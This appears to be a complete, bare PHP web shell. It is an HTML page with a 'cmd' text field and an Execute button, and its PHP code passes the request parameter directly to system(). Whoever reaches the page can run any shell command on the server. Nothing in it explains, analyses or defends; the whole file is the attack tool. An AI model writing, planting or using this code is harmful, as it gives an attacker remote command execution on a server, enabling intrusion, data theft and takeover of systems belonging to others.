<html>
<body>
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?
    $cmd = $_GET["cmd"];
    system($cmd);
?>
</pre>
</body>
</html>
